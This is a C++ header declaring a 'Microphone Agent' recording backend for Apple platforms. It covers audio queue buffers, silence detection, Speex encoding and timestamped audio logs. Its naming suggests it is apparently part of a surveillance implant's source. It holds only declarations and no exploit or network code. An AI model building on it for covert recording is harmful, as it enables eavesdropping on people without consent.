/*
 * RCSIMicrophoneRecorder.h
 *  Microphone Agent - recording backend
 *
 *
 * Created on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSIMicrophoneRecorder_h__
#define __RCSIMicrophoneRecorder_h__

#include <AudioToolbox/AudioToolbox.h>
#include <Foundation/Foundation.h>
#include <libkern/OSAtomic.h>

#include "CAStreamBasicDescription.h"
#include "CAXException.h"

#define kNumberRecordBuffers	3

#define LOG_AUDIO_CODEC_SPEEX   0x00;
#define LOG_AUDIO_CODEC_AMR     0x01;

typedef struct _microphone {
  u_int detectSilence;
  u_int silenceThreshold;
} microphoneAgentStruct;

typedef struct _microphoneHeader {
  u_int version;
#define LOG_MICROPHONE_VERSION 2008121901
  u_int sampleRate;
  u_int hiTimestamp;
  u_int loTimestamp;
} microphoneAdditionalStruct;


#pragma pack(2)

typedef struct _waveFormat
{
  short         formatTag;          /* format type */
  short         nChannels;          /* number of channels (i.e. mono, stereo...) */
  u_int         nSamplesPerSec;     /* sample rate */
  u_int         nAvgBytesPerSec;    /* for buffer estimation */
  short         blockAlign;         /* block size of data */
  short         bitsPerSample;      /* number of bits per sample of mono data */
  //short         size;               /* the count in bytes of the size of */
} waveHeader;

// See http://developer.apple.com/IPhone/library/samplecode/SpeakHere/index.html#//apple_ref/doc/uid/DTS40007802
class _i_MicrophoneRecorder
{
public:
  _i_MicrophoneRecorder();
  ~_i_MicrophoneRecorder();
  
  //
  // Accessors
  //
  UInt32              GetNumberChannels() const { return mRecordFormat.NumberChannels(); }
  CFStringRef         GetFileName()       const { return mFileName; }
  AudioQueueRef       Queue()             const { return mQueue; }
  CAStreamBasicDescription DataFormat()   const { return mRecordFormat; }
  Boolean             IsRunning()         const { return mIsRunning; }
  
  int32_t             getLoTimestamp()    const { return mLoTimestamp; }
  int32_t             getHiTimestamp()    const { return mHiTimestamp; }
  
  void setLoTimestamp(int32_t loTimestamp)  { mLoTimestamp = loTimestamp; }
  void setHiTimestamp(int32_t hiTimestamp)  { mHiTimestamp = hiTimestamp; }
  
  void setVAD(u_int isVADActive)            { mIsVADActive = isVADActive; }
  void setSilenceThreshold(u_int silenceThreshold) { mSilenceThreshold = silenceThreshold; }
  
  void        StartRecord();
  void        StopRecord();
  void        createLogForBufferedAudio (int);
  
  UInt64      startTime;
  
private:
  CFStringRef               mFileName;
  AudioQueueRef             mQueue;
  AudioQueueBufferRef       mBuffers[kNumberRecordBuffers];
  AudioFileID               mRecordFile;
  SInt64                    mRecordPacket; // current packet number in record file
  CAStreamBasicDescription  mRecordFormat;
  
  Boolean                   mIsRunning;
  
  int32_t                   mLoTimestamp;
  int32_t                   mHiTimestamp;
  
  u_int                     mIsVADActive;
  u_int                     mSilenceThreshold;
  
  void      CopyEncoderCookieToFile();
  void      SetupAudioFormat(UInt32 inFormatID);
  int       ComputeRecordBufferSize(const AudioStreamBasicDescription *format, float seconds);
  BOOL      speexEncodeBuffer(void *input,
                              u_int audioChunkSize,
                              u_int channels,
                              int fileCounter);
  
  static void MyInputBufferHandler(void *inUserData,
                                   AudioQueueRef         inAQ,
                                   AudioQueueBufferRef   inBuffer,
                                   const AudioTimeStamp *inStartTime,
                                   UInt32                inNumPackets,
                                   const AudioStreamPacketDescription *inPacketDesc);
};

#endif
